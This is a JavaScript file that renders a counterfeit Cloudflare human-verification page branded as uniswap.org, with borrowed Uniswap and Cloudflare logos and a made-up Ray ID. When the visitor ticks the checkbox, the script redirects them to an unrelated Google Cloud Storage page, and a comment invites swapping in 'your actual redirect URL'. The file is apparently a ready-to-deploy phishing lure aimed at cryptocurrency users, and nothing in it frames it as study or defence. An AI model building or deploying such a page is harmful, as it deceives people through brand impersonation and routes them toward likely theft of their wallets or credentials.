// Function to dynamically load external stylesheets

function loadCSS(href) {

  const link = document.createElement('link');

  link.rel = 'stylesheet';

  link.href = href;

  document.head.appendChild(link);

}



// Function to dynamically load external scripts

function loadScript(src, callback) {

  const script = document.createElement('script');

  script.src = src;

  script.onload = callback;

  document.head.appendChild(script);

}



// Main function to build the page

function buildPage() {

  // Set body styles

  document.body.className = 'bg-[#282828] min-h-screen flex flex-col justify-center';

  document.body.style.fontFamily = "'Roboto', Arial, sans-serif";



  // Inject custom styles into the head

  const style = document.createElement('style');

  style.textContent = `

    input[type="checkbox"] {

      width: 32px;

      height: 32px;

      accent-color: #fff;

      border: 2px solid #888;

    }

  `;

  document.head.appendChild(style);



  // --- Main Content ---

  const mainContainer = document.createElement('div');

  mainContainer.className = 'flex-1 flex flex-col items-center justify-center px-4';



  const contentWrapper = document.createElement('div');

  contentWrapper.className = 'w-full max-w-md';



  // Header section

  const header = document.createElement('div');

  header.className = 'flex items-center mb-2';



  const logo = document.createElement('img');

  logo.src = 'https://files.swissborg.com/product/wealth-app/assets/ic_crypto_uni.png';

  logo.alt = 'Uniswap logo, a pink unicorn head on a transparent background';

  logo.className = 'w-8 h-8 mr-2';



  const title = document.createElement('div');

  title.className = 'text-white text-3xl font-normal';

  title.textContent = 'uniswap.org';



  header.appendChild(logo);

  header.appendChild(title);



  // Sub-header text

  const subheader = document.createElement('div');

  subheader.className = 'text-gray-200 text-xl font-normal mb-8';

  subheader.textContent = 'Confirm you are human by performing the action below.';



  // Checkbox box

  const checkboxContainer = document.createElement('div');

  checkboxContainer.className = 'bg-white rounded-sm shadow-md flex items-center px-4 py-4 mb-8 w-[350px] max-w-full';



  const checkbox = document.createElement('input');

  checkbox.id = 'humanCheck';

  checkbox.type = 'checkbox';

  checkbox.className = 'mr-3 mt-1 border-gray-400';

  checkbox.style.minWidth = '32px';

  checkbox.style.minHeight = '32px';



  const label = document.createElement('label');

  label.id = 'checkboxLabel';

  label.htmlFor = 'humanCheck';

  label.className = 'text-gray-700 text-base font-normal mr-6 transition-colors duration-200';

  label.textContent = 'Confirm that you are human';



  // Cloudflare section

  const cloudflareDiv = document.createElement('div');

  cloudflareDiv.className = 'flex flex-col items-center ml-auto';



  const cloudflareLogo = document.createElement('img');

  cloudflareLogo.alt = 'Cloudflare logo, orange cloud and text on white background';

  cloudflareLogo.className = 'w-[110px] h-[28px] object-contain mb-1';

  cloudflareLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/1200px-Cloudflare_Logo.svg.png';

  cloudflareLogo.width = 110;

  cloudflareLogo.height = 28;



  const linksDiv = document.createElement('div');

  linksDiv.className = 'flex space-x-1 text-xs text-gray-500';

  linksDiv.innerHTML = `

    <a class="hover:underline" href="#">Privacy</a>

    <span>•</span>

    <a class="hover:underline" href="#">Terms</a>

  `;



  cloudflareDiv.appendChild(cloudflareLogo);

  cloudflareDiv.appendChild(linksDiv);



  checkboxContainer.appendChild(checkbox);

  checkboxContainer.appendChild(label);

  checkboxContainer.appendChild(cloudflareDiv);

  

  // Security review text

  const securityText = document.createElement('div');

  securityText.className = 'text-gray-200 text-lg font-normal';

  securityText.textContent = 'uniswap.org needs to review the security of your connection before proceeding.';



  // Append main content elements

  contentWrapper.appendChild(header);

  contentWrapper.appendChild(subheader);

  contentWrapper.appendChild(checkboxContainer);

  contentWrapper.appendChild(securityText);

  mainContainer.appendChild(contentWrapper);

  

  // --- Bottom Bar ---

  const bottomBar = document.createElement('div');

  bottomBar.className = 'w-full flex flex-col items-center pb-2';



  const bottomWrapper = document.createElement('div');

  bottomWrapper.className = 'w-full flex flex-col items-center';



  const rayId = document.createElement('div');

  rayId.className = 'text-xs text-pink-400 mb-1';

  rayId.innerHTML = 'Ray ID: <span class="select-all">953a87a01c63a360</span>';



  const helpText = document.createElement('div');

  helpText.className = 'text-xs text-gray-300 text-center px-2';

  helpText.textContent = 'For assistance, please visit the Cloudflare help center.';



  // Append bottom bar elements

  bottomWrapper.appendChild(rayId);

  bottomWrapper.appendChild(helpText);

  bottomBar.appendChild(bottomWrapper);



  // Append all top-level containers to the body

  document.body.appendChild(mainContainer);

  document.body.appendChild(bottomBar);



  // --- Event Listener ---

  document.getElementById('humanCheck').addEventListener('change', function() {

    const label = document.getElementById('checkboxLabel');

    if (this.checked) {

      label.classList.remove('text-gray-700');

      label.classList.add('text-green-600', 'font-medium');

      label.textContent = 'Verifying...';

      setTimeout(function() {

        // IMPORTANT: Replace with your actual redirect URL

        window.location.assign('https://storage.googleapis.com/gooning/unie/index.html/');

      }, 500);

    } else {

      label.classList.remove('text-green-600', 'font-medium');

      label.classList.add('text-gray-700');

      label.textContent = 'Confirm that you are human';

    }

  });

}



// Load external resources and then build the page

document.addEventListener('DOMContentLoaded', () => {

  // Set viewport meta tag

  const meta = document.createElement('meta');

  meta.name = 'viewport';

  meta.content = 'width=device-width, initial-scale=1.0';

  document.head.appendChild(meta);



  // Load CSS files

  loadCSS('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css');

  loadCSS('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');



  // Load Tailwind CSS and then build the page

  loadScript('https://cdn.tailwindcss.com', buildPage);

});
